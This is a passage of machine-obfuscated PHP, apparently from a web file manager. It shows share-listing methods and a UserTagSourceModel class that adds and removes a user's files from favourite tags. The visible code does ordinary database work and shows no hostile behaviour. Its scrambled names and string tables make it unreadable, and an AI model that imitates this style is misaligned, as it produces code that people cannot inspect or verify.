$¾“ŠáÊ¶; $this->model = Model($_SERVER[ÔÕ±ĞšÎ][1423]); } protected function infoParse($–¥Ü±ü¨, $úùßÙ = false, $ŞÑæÜÅ— = false) { $ÁÂ“ÎÆ¢ =& $_SERVER[ÔÕ±ĞšÎ]; return Action($ÁÂ“ÎÆ¢[1258])->sharePathInfo($this->pathParse[$ÁÂ“ÎÆ¢[87]], !0, $úùßÙ); } public function listPath($ˆÛÍêşï, $¬°íÇ = false) { $«®±ï«Í =& $_SERVER[ÔÕ±ĞšÎ]; $Ä¼÷”· = parent::listPath($ˆÛÍêşï, $¬°íÇ); if (!$Ä¼÷”·) { return $Ä¼÷”·; } if (is_array($Ä¼÷”·[$«®±ï«Í[1431]])) { $Ä¼÷”·[$«®±ï«Í[1431]] = Action($«®±ï«Í[1258])->shareItemInfo($Ä¼÷”·[$«®±ï«Í[1431]]); } foreach ($Ä¼÷”· as $š¡Äì¡à => $Æ‰Î¼ö”) { if (!in_array($š¡Äì¡à, array($«®±ï«Í[86], $«®±ï«Í[85]))) { continue; } foreach ($Æ‰Î¼ö” as $èªû“‡¦ => $Òš™ÔÚ) { $Ä¼÷”·[$š¡Äì¡à][$èªû“‡¦] = Action($«®±ï«Í[1258])->shareItemInfo($Òš™ÔÚ); } } return $Ä¼÷”·; } public function listAll($°ş±Ø·) { $ıâ¯Êô =& $_SERVER[ÔÕ±ĞšÎ]; $›âÉ — = IO::info($this->pathParse[$ıâ¯Êô[87]]); if (!$›âÉ —) { return array(); } $Ü˜×Ûò£ = $this->model->listAll($°ş±Ø·); foreach ($Ü˜×Ûò£ as &$ç”ã„™) { $ç”ã„™[$ıâ¯Êô[90]] = Action($ıâ¯Êô[1258])->shareItemInfo($ç”ã„™[$ıâ¯Êô[90]]); } unset($ç”ã„™); return $Ü˜×Ûò£; } } goto eÌã£Ú‰“Ó; CöÀÇÙÖä“: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($µâ¨Ó¼) { $³’£ÚâŸ =& $_SERVER[ÔÕ±ĞšÎ]; return array($³’£ÚâŸ[2094] => array($³’£ÚâŸ[2518] . USER_ID, $³’£ÚâŸ[2095])); } protected function listData() { $¸í“Ü«» =& $_SERVER[ÔÕ±ĞšÎ]; $×É©® = array($¸í“Ü«»[1768] => USER_ID, $¸í“Ü«»[559] => array($¸í“Ü«»[2098], 0)); $¯¿½ç¾î = $¸í“Ü«»[2519]; $“ëà‰Â = $this->field($¯¿½ç¾î)->where($×É©®)->order($¸í“Ü«»[2101])->select(); return $“ëà‰Â ? $“ëà‰Â : array(); } protected function addToTag($£¼Í²À, $Ñâ‘›á‹) { $›‹ªÔæö =& $_SERVER[ÔÕ±ĞšÎ]; if (!Model($›‹ªÔæö[2247])->listData($Ñâ‘›á‹)) { return !1; } if (is_numeric($£¼Í²À)) { $ÅÏµğØ‡ = Model($›‹ªÔæö[899])->pathInfo($£¼Í²À); if (!$ÅÏµğØ‡) { return !1; } } else { $ÅÏµğØ‡ = IO::infoSimple($£¼Í²À); if (!$ÅÏµğØ‡) { return !1; } $»ù œø = $ÅÏµğØ‡[$›‹ªÔæö[32]]; $¼«Œæ–¶ = $ÅÏµğØ‡[$›‹ªÔæö[33]]; if (isset($ÅÏµğØ‡[$›‹ªÔæö[487]])) { $¼«Œæ–¶ = $ÅÏµğØ‡[$›‹ªÔæö[487]] == $›‹ªÔæö[91] ? $›‹ªÔæö[78] : $›‹ªÔæö[232]; } } $ÆôÆÁ² = array($›‹ªÔæö[1768] => USER_ID, $›‹ªÔæö[559] => $Ñâ‘›á‹, $›‹ªÔæö[497] => $£¼Í²À, $›‹ªÔæö[498] => $¼«Œæ–¶ ? $¼«Œæ–¶ : $›‹ªÔæö[492], $›‹ªÔæö[496] => $»ù œø ? $»ù œø : $›‹ªÔæö[12], $›‹ªÔæö[1982] => 0); if ($this->where($ÆôÆÁ²)->find()) { return !1; } return $this->add($ÆôÆÁ²); } protected function removeFromTag($ñ˜¸ŞŸ–, $ŒŒ¹©»ô) { $¨ªÁ©À¤ =& $_SERVER[ÔÕ±ĞšÎ]; if (!Model($¨ªÁ©À¤[2247])->listData($ŒŒ¹©»ô)) { return !1; } if (is_array($ñ˜¸ŞŸ–)) { $ñ˜¸ŞŸ– = array($¨ªÁ©À¤[7], $ñ˜¸ŞŸ–); } $£¦°±ğß = array($¨ªÁ©À¤[1768] => USER_ID, $¨ªÁ©À¤[559] => $ŒŒ¹©»ô, $¨ªÁ©À¤[497] => $ñ˜¸ŞŸ–); return $this->where($£¦°±ğß)->delete(); } protected function removeByTag($Ğ—¨•©) { $÷ÕË”œÀ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Ğ—¨•©) { return !1; } $Æ‚İÒôè = array($÷ÕË”œÀ[1768] => USER_ID, $÷ÕË”œÀ[559] => $Ğ—¨•©); return $this->where($Æ‚İÒôè)->delete(); } protected function removeBySource($ÖÆ¶ª‚§) { $ÈÊ’‘ÒÒ =& $_SERVER[ÔÕ±ĞšÎ]; if (is_array($ÖÆ¶ª‚§)) { $ÖÆ¶ª‚§ = array($ÈÊ’‘ÒÒ[7], $ÖÆ¶ª‚§); } $£‡°â… = array($ÈÊ’‘ÒÒ[1768] => USER_ID, $ÈÊ’‘ÒÒ[559] => array($ÈÊ’‘ÒÒ[1093], 0), $ÈÊ’‘ÒÒ[497] => $ÖÆ¶ª‚§); return $this->where($£‡°â…)->delete(); } }